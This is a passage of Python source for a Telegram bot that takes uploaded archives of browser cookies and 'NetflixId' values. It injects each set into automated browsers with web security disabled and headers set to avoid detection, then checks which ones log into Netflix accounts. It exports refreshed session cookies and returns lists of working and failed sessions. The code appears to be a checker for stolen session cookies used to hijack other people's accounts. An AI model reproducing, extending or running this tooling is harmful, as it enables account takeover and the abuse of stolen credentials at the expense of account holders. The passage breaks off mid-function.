import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
import os
import zipfile
import tempfile
import shutil
from dotenv import load_dotenv
import asyncio
from playwright.async_api import async_playwright
import json
import time
import re
from text_patterns import text_processor
import urllib.parse

# Load environment variables
load_dotenv()

# Import bot token from config
try:
    from config import BOT_TOKEN
except ImportError:
    print("❌ Error: config.py file not found!")
    print("Please create config.py file with your bot token:")
    print("BOT_TOKEN = 'your_bot_token_here'")
    exit(1)

# Check if token is set
if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
    print("❌ Error: Please set your bot token in config.py file!")
    print("Replace 'YOUR_BOT_TOKEN_HERE' with your actual bot token")
    exit(1)

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Global variable to store processed cookies for command access
processed_cookies = {}

# Global variable to store current session state
session_state = {
    'current_page': 0,
    'cookies_per_page': 6,
    'total_cookies': 0,
    'all_cookies': [],
    'waiting_for_start_number': False,  # New: Track if waiting for start number
    'pending_continue_view_data': None  # New: Store pending continue view data
}

# Global browser manager to prevent auto-closing
active_browsers = {}

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /start command"""
    user = update.effective_user
    welcome_message = f"""
🚀 Welcome {user.first_name}! 

I'm your Telegram bot. Here are the available commands:

/start - Show this welcome message
/help - Show help information
/status - Check bot status

📁 **ZIP File Processing:**
Send me ANY ZIP file and I'll automatically:
- Extract the ZIP file
- Find all .txt files (including in subfolders)
- Count total .txt files
- Send you the count immediately

📄 **Text File Processing:**
Send me ANY .txt file and I'll automatically:
- Analyze the text content
- Detect patterns (Netflix accounts, email:password, cookies, etc.)
- Extract account information
- Show detailed analysis

🎬 **Netflix ID Processing:**
Send me a Netflix ID message (starting with NetflixId=) and I'll:
- Process the Netflix ID directly
- Open a single session in debug mode
- Load cookies and check the session

🎬 **Cookie Management:**
After processing ZIP, you can:
- Convert cookies to header strings
- Continue view (open 6 cookies in debug mode with navigation)
- Use /<number> to open specific cookies (e.g., /1, /2)

Just send any ZIP file, TXT file, or Netflix ID message and I'll start processing right away!
    """
    await update.message.reply_text(welcome_message)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /help command"""
    help_text = """
📚 **Commands:** /start, /help, /status

📁 **ZIP Processing:** Send any ZIP file - I'll count all .txt files automatically!

📄 **Text File Processing:** Send any .txt file - I'll analyze patterns and extract account info!

🎬 **Netflix ID Processing:** Send a Netflix ID message (starting with NetflixId=) - I'll process it directly!

🎬 **Cookie Commands:**
- /<number> - Open specific cookie by number (e.g., /1, /2)
- Only works after ZIP processing

💡 **Usage:** Send commands or just send a ZIP file, TXT file, or Netflix ID message to process.
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /status command"""
    status_message = """
✅ **Bot Status:**
- Bot is running and active
- All commands are working
- Ready to receive messages, ZIP files, and TXT files
- ZIP processing functionality is ready
- Text file pattern analysis is ready
- Cookie management with Firefox browser
    """
    await update.message.reply_text(status_message, parse_mode='Markdown')

def find_txt_files(directory):
    """Recursively find all .txt files in a directory"""
    txt_files = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.lower().endswith('.txt'):
                txt_files.append(os.path.join(root, file))
    return txt_files

async def convert_cookies_to_header_string(cookies):
    """Convert cookies to header string format"""
    header_string = ""
    for cookie in cookies:
        header_string += f"{cookie['name']}={cookie['value']}; "
    return header_string.strip()

async def open_cookies_in_debug_mode(cookies_list, update, context, page_number=0, max_cookies=6):
    """Open multiple cookies in debug mode with Firefox browser and pagination"""
    try:
        global session_state, active_browsers
        
        # Calculate start and end indices for current page
        start_index = page_number * max_cookies
        end_index = start_index + max_cookies
        cookies_to_open = cookies_list[start_index:end_index]
        
        if not cookies_to_open:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ No more cookies to open on this page."
            )
            return
        
        # Launch browser with debug mode - OUTSIDE async with to prevent auto-close
        p = await async_playwright().start()
        
        # Try different browsers in order of preference
        browser = None
        browser_name = "Unknown"
        
        try:
            # Try Firefox first
            browser = await p.firefox.launch(
                headless=False,
                slow_mo=1000,
                args=[
                    '--disable-web-security',
                    '--disable-features=VizDisplayCompositor',
                    '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
                ]
            )
            browser_name = "Firefox"
        except Exception as e:
            logger.warning(f"Firefox launch failed: {e}")
            try:
                # Try Chromium as fallback
                browser = await p.chromium.launch(
                    headless=False,
                    slow_mo=1000,
                    args=[
                        '--disable-web-security',
                        '--disable-features=VizDisplayCompositor',
                        '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                    ]
                )
                browser_name = "Chromium"
            except Exception as e2:
                logger.warning(f"Chromium launch failed: {e2}")
                try:
                    # Try WebKit as last resort
                    browser = await p.webkit.launch(
                        headless=False,
                        slow_mo=1000
                    )
                    browser_name = "WebKit"
                except Exception as e3:
                    logger.error(f"All browser launches failed: {e3}")
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text="❌ Error: Could not launch any browser. Please install browser binaries using: python -m playwright install"
                    )
                    return
        
        if not browser:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ Error: No browser available. Please install browser binaries."
            )
            return
        
        # Update message with browser name
        opening_msg = await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"🎬 Opening {len(cookies_to_open)} cookies (Page {page_number + 1}) using {browser_name}..."
        )
        
        # Store browser reference to prevent garbage collection
        chat_id = update.effective_chat.id
        active_browsers[chat_id] = {
            'browser': browser,
            'playwright': p,
            'contexts': [],
            'pages': []
        }
        
        # Create multiple browser contexts for parallel sessions
        contexts = []
        pages = []
        invalid_cookies = []
        valid_cookies = []
        failed_sessions_data = []  # New: Collect failed session data with original indices
        successful_sessions_data = []  # New: Collect successful session data with original indices
        session_message_ids = []  # New: Track individual session message IDs for deletion
        
        for i, cookie_data in enumerate(cookies_to_open):
            try:
                # Create new context for each session with smaller size
                context_instance = await browser.new_context(
                    viewport={'width': 800, 'height': 600}
                )
                page = await context_instance.new_page()
                
                # Clear all storage data for fresh session
                await context_instance.clear_cookies()
                
                # Parse cookies
                cookies = []
                lines = cookie_data['content'].strip().split('\n')
                for line in lines:
                    if line.strip() and '\t' in line:
                        parts = line.strip().split('\t')
                        if len(parts) >= 7:
                            cookie = {
                                'name': parts[5],
                                'value': parts[6],
                                'domain': parts[0],
                                'path': parts[2]
                            }
                            cookies.append(cookie)
                
                if not cookies:
                    invalid_cookies.append(f"Session {start_index + i + 1}: {cookie_data['name']} - No valid cookies")
                    continue
                
                # Set cookies
                await context_instance.add_cookies(cookies)
                
                # Navigate to Netflix with retry mechanism
                max_retries = 3
                success = False
                
                for retry in range(max_retries):
                    try:
                        # Navigate to Netflix with different approaches
                        try:
                            # First try: Navigate to main page (better for cookie-based auth)
                            await page.goto('https://www.netflix.com/in/', wait_until='domcontentloaded', timeout=30000)
                        except:
                            # Second try: Direct navigation to login
                            await page.goto('https://www.netflix.com/in/login', wait_until='domcontentloaded', timeout=30000)
                        
                        await page.wait_for_load_state('networkidle', timeout=30000)
                        
                        # Wait for redirect and check login status
                        await page.wait_for_timeout(5000)
                        current_url = page.url
                        
                        # Check for vizdisplaycompositor URL and reload if found
                        if 'vizdisplaycompositor' in current_url.lower():
                            await context.bot.send_message(
                                chat_id=update.effective_chat.id,
                                text=f"🔄 Session {start_index + i + 1}: Reloading due to vizdisplaycompositor URL..."
                            )
                            # Clear cookies and set them again
                            await context_instance.clear_cookies()
                            await context_instance.add_cookies(cookies)
                            await page.reload()
                            await page.wait_for_load_state('networkidle', timeout=30000)
                            await page.wait_for_timeout(5000)
                            current_url = page.url
                        
                        # Check for successful login with multiple indicators
                        if ('/browse' in current_url or '/browser' in current_url or 'netflix.com/browse' in current_url or 
                            'netflix.com/in' in current_url and 'login' not in current_url.lower()):
                            # Navigate to account page
                            await page.goto('https://www.netflix.com/in/account', wait_until='domcontentloaded', timeout=30000)
                            await page.wait_for_load_state('networkidle', timeout=30000)
                            
                            # Send success message with translate button
                            keyboard = [[InlineKeyboardButton("🌐 Translate to English", callback_data=f"translate_{start_index + i + 1}")]]
                            reply_markup = InlineKeyboardMarkup(keyboard)
                            
                            success_msg = await context.bot.send_message(
                                chat_id=update.effective_chat.id,
                                text=f"✅ Session {start_index + i + 1}: {cookie_data['name']} - Success!",
                                reply_markup=reply_markup
                            )
                            session_message_ids.append(success_msg.message_id)
                            valid_cookies.append(f"Session {start_index + i + 1}: {cookie_data['name']}")
                            
                            # Collect successful session data with original index
                            successful_sessions_data.append({
                                'original_index': start_index + i + 1,
                                'name': cookie_data['name'],
                                'content': cookie_data.get('original_content', cookie_data['content']),
                                'status': 'Success'
                            })
                            
                            success = True
                            
                            # Keep browser window open - DO NOT CLOSE
                            contexts.append(context_instance)
                            pages.append(page)
                            break
                        else:
                            # Check if it's a login error page
                            if 'login' in current_url.lower() or 'signin' in current_url.lower():
                                if retry < max_retries - 1:
                                    await page.wait_for_timeout(2000)
                                    continue
                                else:
                                    failed_msg = await context.bot.send_message(
                                        chat_id=update.effective_chat.id,
                                        text=f"❌ Session {start_index + i + 1}: {cookie_data['name']} - Failed after {max_retries} attempts"
                                    )
                                    session_message_ids.append(failed_msg.message_id)
                                    invalid_cookies.append(f"Session {start_index + i + 1}: {cookie_data['name']} - Login failed")
                                    
                                    # Collect failed session data with original index
                                    failed_sessions_data.append({
                                        'original_index': start_index + i + 1,
                                        'name': cookie_data['name'],
                                        'content': cookie_data.get('original_content', cookie_data['content']),
                                        'error_type': 'Login failed'
                                    })
                                    
                                    # Auto-close failed session
                                    try:
                                        await context_instance.close()
                                    except:
                                        pass
                                    break
                            else:
                                # Unknown page, retry
                                if retry < max_retries - 1:
                                    await page.wait_for_timeout(2000)
                                    continue
                                else:
                                    failed_msg = await context.bot.send_message(
                                        chat_id=update.effective_chat.id,
                                        text=f"❌ Session {start_index + i + 1}: {cookie_data['name']} - Page load failed"
                                    )
                                    session_message_ids.append(failed_msg.message_id)
                                    invalid_cookies.append(f"Session {start_index + i + 1}: {cookie_data['name']} - Page load failed")
                                    
                                    # Collect failed session data with original index
                                    failed_sessions_data.append({
                                        'original_index': start_index + i + 1,
                                        'name': cookie_data['name'],
                                        'content': cookie_data.get('original_content', cookie_data['content']),
                                        'error_type': 'Page load failed'
                                    })
                                    
                                    # Auto-close failed session
                                    try:
                                        await context_instance.close()
                                    except:
                                        pass
                                    break
                            
                    except Exception as e:
                        if retry < max_retries - 1:
                            await page.wait_for_timeout(2000)
                            continue
                        else:
                            failed_msg = await context.bot.send_message(
                                chat_id=update.effective_chat.id,
                                text=f"❌ Session {start_index + i + 1}: {cookie_data['name']} - Error: {str(e)[:50]}..."
                            )
                            session_message_ids.append(failed_msg.message_id)
                            invalid_cookies.append(f"Session {start_index + i + 1}: {cookie_data['name']} - Error")
                            
                            # Collect failed session data with original index
                            failed_sessions_data.append({
                                'original_index': start_index + i + 1,
                                'name': cookie_data['name'],
                                'content': cookie_data.get('original_content', cookie_data['content']),
                                'error_type': f'Error: {str(e)[:50]}...'
                            })
                            
                            # Auto-close failed session
                            try:
                                await context_instance.close()
                            except:
                                pass
                            break
                
                # If no success and no browser window added yet, close it
                if not success and context_instance not in contexts:
                    try:
                        await context_instance.close()
                    except:
                        pass
                
            except Exception as e:
                failed_msg = await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"❌ Session {start_index + i + 1}: {cookie_data['name']} - Critical Error"
                )
                session_message_ids.append(failed_msg.message_id)
                invalid_cookies.append(f"Session {start_index + i + 1}: {cookie_data['name']} - Critical Error")
                
                # Collect failed session data with original index
                failed_sessions_data.append({
                    'original_index': start_index + i + 1,
                    'name': cookie_data['name'],
                    'content': cookie_data.get('original_content', cookie_data['content']),
                    'error_type': 'Critical Error'
                })
                
                # Auto-close failed session
                try:
                    if 'context_instance' in locals():
                        await context_instance.close()
                except:
                    pass
        
        # Update global browser manager
        active_browsers[chat_id]['contexts'] = contexts
        active_browsers[chat_id]['pages'] = pages
        
        # Send completion message with navigation buttons and status summary
        total_pages = (len(cookies_list) + max_cookies - 1) // max_cookies
        keyboard = []
        
        # Add navigation buttons
        nav_buttons = []
        if page_number > 0:
            nav_buttons.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"prev_page_{page_number}"))
        if page_number < total_pages - 1:
            nav_buttons.append(InlineKeyboardButton("➡️ Next", callback_data=f"next_page_{page_number}"))
        
        if nav_buttons:
            keyboard.append(nav_buttons)
        
        # Add translate buttons for successful sessions
        if successful_sessions_data:
            translate_buttons = []
            for session in successful_sessions_data:
                translate_buttons.append(InlineKeyboardButton(f"Tr - {session['original_index']}", callback_data=f"translate_{session['original_index']}"))
            
            # Add translate buttons to keyboard (max 3 per row for better layout)
            translate_row = []
            for i, button in enumerate(translate_buttons):
                translate_row.append(button)
                if len(translate_row) == 3 or i == len(translate_buttons) - 1:
                    keyboard.append(translate_row)
                    translate_row = []
        
        # Add close button
        keyboard.append([InlineKeyboardButton("❌ Close Sessions", callback_data="close_sessions")])
        
        reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
        
        # Create short status summary
        status_summary = f"🎬 Page {page_number + 1}/{total_pages} - ✅ {len(valid_cookies)} | ❌ {len(invalid_cookies)} (auto-closed) | 🔗 {len(contexts)} windows open"
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=status_summary,
            reply_markup=reply_markup
        )
        
        # Generate failed sessions file if there are any failed sessions
        if failed_sessions_data:
            try:
                # Create temporary directory for the failed sessions file
                temp_dir = tempfile.mkdtemp()
                failed_sessions_filename = f"{len(failed_sessions_data)}x_Failed_Sessions.txt"
                failed_sessions_filepath = os.path.join(temp_dir, failed_sessions_filename)
                
                # Write failed sessions data to file
                with open(failed_sessions_filepath, 'w', encoding='utf-8') as f:
                    f.write(f"Failed Sessions Report - Page {page_number + 1}\n")
                    f.write(f"Total Failed Sessions: {len(failed_sessions_data)}\n")
                    f.write("=" * 50 + "\n\n")
                    
                    for failed_session in failed_sessions_data:
                        f.write(f"Original Index: {failed_session['original_index']}\n")
                        f.write(f"Session Name: {failed_session['name']}\n")
                        f.write(f"Error Type: {failed_session['error_type']}\n")
                        f.write(f"Session Content:\n{failed_session['content']}\n")
                        f.write("\n" + "=" * 50 + "\n\n")
                
                # Send the failed sessions file
                with open(failed_sessions_filepath, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=update.effective_chat.id,
                        document=f,
                        filename=failed_sessions_filename,
                        caption=f"📄 Failed Sessions Report - Page {page_number + 1}\n❌ {len(failed_sessions_data)} failed sessions found"
                    )
                
                # Clean up temporary directory
                try:
                    shutil.rmtree(temp_dir)
                except:
                    pass
                    
            except Exception as e:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"❌ Error generating failed sessions file: {str(e)[:50]}..."
                )
        
        # Generate successful sessions file if there are any successful sessions
        if successful_sessions_data:
            try:
                # Create temporary directory for the successful sessions file
                temp_dir = tempfile.mkdtemp()
                successful_sessions_filename = f"{len(successful_sessions_data)}x_Successful_Sessions.txt"
                successful_sessions_filepath = os.path.join(temp_dir, successful_sessions_filename)
                
                # Write successful sessions data to file
                with open(successful_sessions_filepath, 'w', encoding='utf-8') as f:
                    f.write(f"Successful Sessions Report - Page {page_number + 1}\n")
                    f.write(f"Total Successful Sessions: {len(successful_sessions_data)}\n")
                    f.write("=" * 50 + "\n\n")
                    
                    for successful_session in successful_sessions_data:
                        f.write(f"Original Index: {successful_session['original_index']}\n")
                        f.write(f"Session Name: {successful_session['name']}\n")
                        f.write(f"Status: {successful_session['status']}\n")
                        f.write(f"Session Content:\n{successful_session['content']}\n")
                        f.write("\n" + "=" * 50 + "\n\n")
                
                # Send the successful sessions file
                with open(successful_sessions_filepath, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=update.effective_chat.id,
                        document=f,
                        filename=successful_sessions_filename,
                        caption=f"📄 Successful Sessions Report - Page {page_number + 1}\n✅ {len(successful_sessions_data)} successful sessions found"
                    )
                
                # Clean up temporary directory
                try:
                    shutil.rmtree(temp_dir)
                except:
                    pass
                    
            except Exception as e:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"❌ Error generating successful sessions file: {str(e)[:50]}..."
                )
        
        # Delete individual session messages after both TXT files are sent
        if session_message_ids:
            try:
                for msg_id in session_message_ids:
                    try:
                        await context.bot.delete_message(
                            chat_id=update.effective_chat.id,
                            message_id=msg_id
                        )
                    except Exception as e:
                        # Ignore errors if message is already deleted or not found
                        pass
            except Exception as e:
                # Ignore errors in bulk deletion
                pass
        
        # Delete the "Opening X cookies" message after both TXT files are sent
        try:
            await context.bot.delete_message(
                chat_id=update.effective_chat.id,
                message_id=opening_msg.message_id
            )
        except Exception as e:
            # Ignore errors if message is already deleted or not found
            pass
        
        # IMPORTANT: DO NOT CLOSE BROWSER - Let user close manually
        # Browser will stay open until manually closed by user
        
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ Error in debug mode: {str(e)[:50]}..."
        )

async def open_specific_cookie(cookie_number, update, context):
    """Open a specific cookie by number"""
    try:
        if not processed_cookies:
            await update.message.reply_text("❌ No cookies available. Please process a ZIP file or TXT file first.")
            return
        
        if cookie_number < 1 or cookie_number > len(processed_cookies):
            await update.message.reply_text(f"❌ Invalid cookie number. Available: 1-{len(processed_cookies)}")
            return
        
        cookie_data = processed_cookies[cookie_number - 1]
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"🎬 Opening cookie #{cookie_number}: {cookie_data['name']}..."
        )
        
        async with async_playwright() as p:
            # Launch Firefox browser
            browser = await p.firefox.launch(
                headless=False,
                slow_mo=1000,
                args=[
                    '--disable-web-security',
                    '--disable-features=VizDisplayCompositor',
                    '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
                ]
            )
            
            context_instance = await browser.new_context(
                viewport={'width': 800, 'height': 600}
            )
            page = await context_instance.new_page()
            
            # Clear all storage data for fresh session
            await context_instance.clear_cookies()
            
            # Parse cookies - handle both tab-separated and NetflixId format
            cookies = []
            
            # Check if this is NetflixId format (from TXT files)
            if 'NetflixId=' in cookie_data['content'] and 'SecureNetflixId=' in cookie_data['content']:
                # Use the original content for TXT files
                cookie_content = cookie_data.get('original_content', cookie_data['content'])
                # Convert to tab format for Playwright
                tab_format = convert_netflix_cookies_to_tab_format(cookie_content)
                lines = tab_format.strip().split('\n')
            else:
                # Use tab-separated format (from ZIP files)
                lines = cookie_data['content'].strip().split('\n')
            
            for line in lines:
                if line.strip() and '\t' in line:
                    parts = line.strip().split('\t')
                    if len(parts) >= 7:
                        cookie = {
                            'name': parts[5],
                            'value': parts[6],
                            'domain': parts[0],
                            'path': parts[2]
                        }
                        cookies.append(cookie)
            
            if not cookies:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"❌ Cookie #{cookie_number}: {cookie_data['name']} - No valid cookies found!"
                )
                return
            
            # Set cookies
            await context_instance.add_cookies(cookies)
            
            # Navigate to Netflix with retry mechanism
            max_retries = 3
            success = False
            
            for retry in range(max_retries):
                try:
                    # Navigate to Netflix
                    await page.goto('https://www.netflix.com/in/login', wait_until='domcontentloaded', timeout=30000)
                    await page.wait_for_load_state('networkidle', timeout=30000)
                    
                    # Wait for redirect and check login status
                    await page.wait_for_timeout(5000)
                    current_url = page.url
                    
                    # Check for problematic URLs and handle them
                    if ('vizdisplaycompositor' in current_url.lower() or 
                        'login?nextpage=' in current_url or 
                        'login?nextpage=' in current_url.lower()):
                        
                        await context.bot.send_message(
                            chat_id=update.effective_chat.id,
                            text=f"🔄 Cookie #{cookie_number}: Detected problematic URL, redirecting to clean login page..."
                        )
                        
                        # Clear cookies and set them again
                        await context_instance.clear_cookies()
                        await context_instance.add_cookies(cookies)
                        
                        # Navigate directly to clean login URL
                        await page.goto('https://www.netflix.com/in/login', wait_until='domcontentloaded', timeout=30000)
                        await page.wait_for_load_state('networkidle', timeout=30000)
                        await page.wait_for_timeout(5000)
                        current_url = page.url
                    
                    if '/browse' in current_url or '/browser' in current_url:
                        # Navigate to account page
                        await page.goto('https://www.netflix.com/in/account', wait_until='domcontentloaded', timeout=30000)
                        await page.wait_for_load_state('networkidle', timeout=30000)
                        
                        await context.bot.send_message(
                            chat_id=update.effective_chat.id,
                            text=f"✅ Cookie #{cookie_number}: {cookie_data['name']} - Success!"
                        )
                        success = True
                        break
                    else:
                        # Check if it's a login error page
                        if 'login' in current_url.lower() or 'signin' in current_url.lower():
                            if retry < max_retries - 1:
                                await page.wait_for_timeout(2000)
                                continue
                            else:
                                await context.bot.send_message(
                                    chat_id=update.effective_chat.id,
                                    text=f"❌ Cookie #{cookie_number}: {cookie_data['name']} - Failed after {max_retries} attempts"
                                )
                                break
                        else:
                            # Unknown page, retry
                            if retry < max_retries - 1:
                                await page.wait_for_timeout(2000)
                                continue
                            else:
                                await context.bot.send_message(
                                    chat_id=update.effective_chat.id,
                                    text=f"❌ Cookie #{cookie_number}: {cookie_data['name']} - Page load failed"
                                )
                                break
                    
                except Exception as e:
                    if retry < max_retries - 1:
                        await page.wait_for_timeout(2000)
                        continue
                    else:
                        await context.bot.send_message(
                            chat_id=update.effective_chat.id,
                            text=f"❌ Cookie #{cookie_number}: {cookie_data['name']} - Error: {str(e)[:50]}..."
                        )
                        break
            
            # IMPORTANT: DO NOT CLOSE BROWSER - Let user close manually
            # await browser.close()  # This line is commented out to prevent auto-close
            
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ Error opening cookie #{cookie_number}: {str(e)[:50]}..."
        )

async def login_netflix_with_cookies(cookies_text):
    """Login to Netflix using cookies and return header string"""
    try:
        print("🔍 Starting Netflix login process...")
        
        # Parse cookies from text format
        cookies = []
        lines = cookies_text.strip().split('\n')
        for line in lines:
            if line.strip() and '\t' in line:
                parts = line.strip().split('\t')
                if len(parts) >= 7:
                    cookie = {
                        'name': parts[5],
                        'value': parts[6],
                        'domain': parts[0],
                        'path': parts[2]
                    }
                    cookies.append(cookie)
        
        print(f"📋 Parsed {len(cookies)} cookies from text file")
        
        if not cookies:
            return "Error: No valid cookies found"
        
        # Launch Firefox browser with safety features
        print("🌐 Launching Firefox browser...")
        async with async_playwright() as p:
            browser = await p.firefox.launch(
                headless=False, 
                slow_mo=500,  # Slower for safety
                args=[
                    '--disable-web-security',
                    '--disable-features=VizDisplayCompositor',
                    '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
                ]
            )
            context = await browser.new_context()
            page = await context.new_page()
            
            # Set extra headers to avoid detection
            await page.set_extra_http_headers({
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            })
            
            # Set cookies
            print("🍪 Setting cookies...")
            await context.add_cookies(cookies)
            
            # Navigate to Netflix login page with proper loading
            print("🎬 Navigating to Netflix login page...")
            await page.goto('https://www.netflix.com/in/login', wait_until='domcontentloaded')
            
            # Wait for page to fully load
            print("⏳ Waiting for page to load completely...")
            await page.wait_for_load_state('networkidle', timeout=30000)
            await page.wait_for_timeout(3000)  # Extra safety wait
            
            # Check if login was successful by URL change
            try:
                print("🔍 Checking login status...")
                await page.wait_for_timeout(5000)  # Wait for redirect
                
                # Check current URL to see if login was successful
                current_url = page.url
                print(f"📍 Current URL: {current_url}")
                
                # Check if we're logged in by URL change to /browser
                if '/browse' in current_url or '/browser' in current_url:
                    print("✅ Login successful! Redirected to browse page")
                    
                    # Wait before navigating to account page
                    await page.wait_for_timeout(2000)
                    
                    # Navigate to account page with proper loading
                    print("👤 Navigating to account page...")
                    await page.goto('https://www.netflix.com/in/account', wait_until='domcontentloaded')
                    await page.wait_for_load_state('networkidle', timeout=30000)
                    await page.wait_for_timeout(3000)  # Extra safety wait
                    
                    # Get updated cookies from account page
                    print("🍪 Exporting cookies from account page...")
                    updated_cookies = await context.cookies()
                    header_string = await convert_cookies_to_header_string(updated_cookies)
                    print("🔧 Converting cookies to header string...")
                    
                    # Wait before closing to ensure all operations complete
                    await page.wait_for_timeout(2000)
                    await browser.close()
                    return header_string
                else:
                    print("❌ Login failed - URL didn't change to browse page")
                    await page.wait_for_timeout(2000)
                    await browser.close()
                    return "Error: Login failed - invalid cookies"
                    
            except Exception as e:
                print(f"❌ Error during login process: {str(e)}")
                await browser.close()
                return f"Error during login process: {str(e)}"
                
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return f"Error: {str(e)}"

async def process_netflix_cookies_parallel(cookies_list, update, context, processing_msg):
    """Process multiple Netflix cookies in parallel with different browser sessions"""
    results = []
    
    async def process_single_cookie(cookie_data, index):
        """Process a single cookie in its own browser session"""
        try:
            print(f"🔍 Starting Netflix login process for session {index + 1}...")
            
            # Parse cookies from text format
            cookies = []
            lines = cookie_data['content'].strip().split('\n')
            for line in lines:
                if line.strip() and '\t' in line:
                    parts = line.strip().split('\t')
                    if len(parts) >= 7:
                        cookie = {
                            'name': parts[5],
                            'value': parts[6],
                            'domain': parts[0],
                            'path': parts[2]
                        }
                        cookies.append(cookie)
            
            print(f"📋 Session {index + 1}: Parsed {len(cookies)} cookies")
            
            if not cookies:
                return {
                    'name': cookie_data['name'],
                    'content': cookie_data['content'],
                    'header_cookies': "Error: No valid cookies found",
                    'status': 'failed'
                }
            
            # Launch Firefox browser with unique persistent context
            print(f"🌐 Session {index + 1}: Launching Firefox browser...")
            async with async_playwright() as p:
                # Use persistent context with unique user data directory and safety features
                browser_context = await p.firefox.launch_persistent_context(
                    user_data_dir=f"/tmp/firefox_session_{index}",
                    headless=False,
                    slow_mo=500,  # Slower for safety
                    args=[
                        '--disable-web-security',
                        '--disable-features=VizDisplayCompositor',
                        '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
                    ]
                )
                page = await browser_context.new_page()
                
                # Set extra headers to avoid detection
                await page.set_extra_http_headers({
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                })
                
                # Set cookies
                print(f"🍪 Session {index + 1}: Setting cookies...")
                await browser_context.add_cookies(cookies)
                
                # Navigate to Netflix login page with proper loading
                print(f"🎬 Session {index + 1}: Navigating to Netflix login page...")
                await page.goto('https://www.netflix.com/in/login', wait_until='domcontentloaded')
                
                # Wait for page to fully load
                print(f"⏳ Session {index + 1}: Waiting for page to load completely...")
                await page.wait_for_load_state('networkidle', timeout=30000)
                await page.wait_for_timeout(3000)  # Extra safety wait
                
                # Check if login was successful by URL change
                try:
                    print(f"🔍 Session {index + 1}: Checking login status...")
                    await page.wait_for_timeout(5000)  # Wait for redirect
                    
                    # Check current URL to see if login was successful
                    current_url = page.url
                    print(f"📍 Session {index + 1}: Current URL: {current_url}")
                    
                    # Check if we're logged in by URL change to /browser
                    if '/browse' in current_url or '/browser' in current_url:
                        print(f"✅ Session {index + 1}: Login successful! Redirected to browse page")
                        
                        # Wait before navigating to account page
                        await page.wait_for_timeout(2000)
                        
                        # Navigate to account page with proper loading
                        print(f"👤 Session {index + 1}: Navigating to account page...")
                        await page.goto('https://www.netflix.com/in/account', wait_until='domcontentloaded')
                        await page.wait_for_load_state('networkidle', timeout=30000)
                        await page.wait_for_timeout(3000)  # Extra safety wait
                        
                        # Get updated cookies from account page
                        print(f"🍪 Session {index + 1}: Exporting cookies from account page...")
                        updated_cookies = await browser_context.cookies()
                        header_string = await convert_cookies_to_header_string(updated_cookies)
                        print(f"🔧 Session {index + 1}: Converting cookies to header string...")
                        
                        # Wait before closing to ensure all operations complete
                        await page.wait_for_timeout(2000)
                        await browser_context.close()
                        return {
                            'name': cookie_data['name'],
                            'content': cookie_data['content'],
                            'header_cookies': header_string,
                            'status': 'success'
                        }
                    else:
                        print(f"❌ Session {index + 1}: Login failed - URL didn't change to browse page")
                        await page.wait_for_timeout(2000)
                        await browser_context.close()
                        return {
                            'name': cookie_data['name'],
                            'content': cookie_data['content'],
                            'header_cookies': "❌ Login failed - invalid cookies",
                            'status': 'failed'
                        }
                        
                except Exception as e:
                    print(f"❌ Session {index + 1}: Error during login process: {str(e)}")
                    await browser_context.close()
                    return {
                        'name': cookie_data['name'],
                        'content': cookie_data['content'],
                        'header_cookies': f"❌ Error during login process: {str(e)}",
                        'status': 'failed'
                    }
                    
        except Exception as e:
            print(f"❌ Session {index + 1}: Error: {str(e)}")
            return {
                'name': cookie_data['name'],
                'content': cookie_data['content'],
                'header_cookies': f"❌ Error: {str(e)}",
                'status': 'failed'
            }
    
    # Process cookies in batches of 10 with safety delays
    batch_size = 10
    for i in range(0, len(cookies_list), batch_size):
        batch = cookies_list[i:i + batch_size]
        
        # Update processing message
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=processing_msg.message_id,
